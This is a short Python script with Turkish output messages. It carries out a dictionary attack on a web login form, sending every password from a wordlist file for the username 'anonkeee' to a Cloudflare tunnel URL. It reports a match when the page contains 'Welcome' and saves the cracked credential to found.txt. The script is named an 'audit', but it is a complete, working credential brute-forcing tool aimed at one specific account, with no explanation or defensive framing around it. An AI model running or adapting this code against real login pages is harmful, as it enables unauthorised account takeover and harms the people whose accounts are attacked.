import time
import sys
from pathlib import Path
import requests

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

TARGET_URL = "https://vital-shanghai-certified-spencer.trycloudflare.com" 
USERNAME = "anonkeee"
WORDLIST_FILE = "wordlist.txt"

def run_audit():
    wordlist_path = Path(WORDLIST_FILE)
    if not wordlist_path.exists():
        print(f"{RED}[-] Wordlist bulunamadı: {wordlist_path}{RESET}")
        sys.exit(1)

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    total = len(passwords)
    print(f"\n{YELLOW}[+] Başlatılıyor -> Hedef: @{USERNAME} | Toplam: {total} şifre{RESET}\n")
    print(f"{CYAN}[*] Hedef Bağlantı: {TARGET_URL}{RESET}\n")

    session = requests.Session()
    session.headers.update({"Connection": "close"})
    
    for index, password in enumerate(passwords, 1):
        # Form alan adları standart HTML isimlerine (username / password) geri çekildi
        payload = {
            "username": USERNAME,
            "password": password
        }

        try:
            response = session.post(TARGET_URL, data=payload, timeout=4)
            
            if "Welcome" in response.text:
                print(f"\n{GREEN}[+] EŞLEŞME BULUNDU! Şifre: {password}{RESET}")
                with open("found.txt", "w", encoding='utf-8') as out:
                    out.write(f"{USERNAME}:{password}\n")
                break
            else:
                print(f"{YELLOW}[*] Deneniyor ({index}/{total}): {password:<15}... {RED}Başarısız (Kod: {response.status_code}){RESET}")
        except requests.exceptions.Timeout:
            print(f"{RED}[!] Zaman aşımı: Sunucu yanıt vermedi{RESET}")
        except requests.exceptions.ConnectionError:
            print(f"{RED}[!] Bağlantı hatası: Tünel veya sunucu kapandı{RESET}")
        except requests.RequestException as e:
            print(f"{RED}[!] Hata: {e}{RESET}")

        time.sleep(0.2)

if __name__ == "__main__":
    run_audit()
